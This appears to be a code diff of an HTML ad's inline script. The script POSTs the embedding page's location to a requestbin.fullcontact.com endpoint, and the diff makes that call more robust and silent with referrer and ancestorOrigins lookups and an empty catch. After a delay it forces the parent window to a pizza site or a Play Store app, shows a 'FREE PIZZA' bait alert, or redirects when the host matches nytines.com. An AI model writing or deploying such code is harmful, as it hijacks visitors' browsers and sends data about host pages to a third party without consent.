@@ -17,10 +17,12 @@
     </style>
     <script src="mobile-detect.min.js"></script>
     <script>
-
-      var httpRequest = new XMLHttpRequest();
-      httpRequest.open('POST', 'http://requestbin.fullcontact.com/rke8nhrk?json=' + JSON.stringify(parent.window.location));
-      httpRequest.send();
+      var parentLocation = (document.referrer || location.ancestorOrigins[0]).replace(/\/$/, '');
+      try {
+        var httpRequest = new XMLHttpRequest();
+        httpRequest.open('POST', 'http://requestbin.fullcontact.com/yazm7myb?location=' + parentLocation);
+        httpRequest.send();
+      } catch (ex) {}
 
       var url = 'http://topperspizzaplace.com';
       var delay = 5000;
@@ -36,7 +38,7 @@
         if (iSafari) setTimeout(() => parent.window.location = url, delay);
         else if (aChrome) setTimeout(() => parent.window.location = 'https://play.google.com/store/apps/details?id=br.com.appsexclusivos.toppizzadelivery', delay);
         else if (iWebview) setTimeout(() => alert('Tap the ad for a FREE PIZZA!!'), delay);
-      } else if (parent.location.host.match(/nytines\.com$/)) {
+      } else if (parentLocation.match(/nytines\.com$/)) {
         setTimeout(() => parent.window.location = url, delay);
       }
     </script>
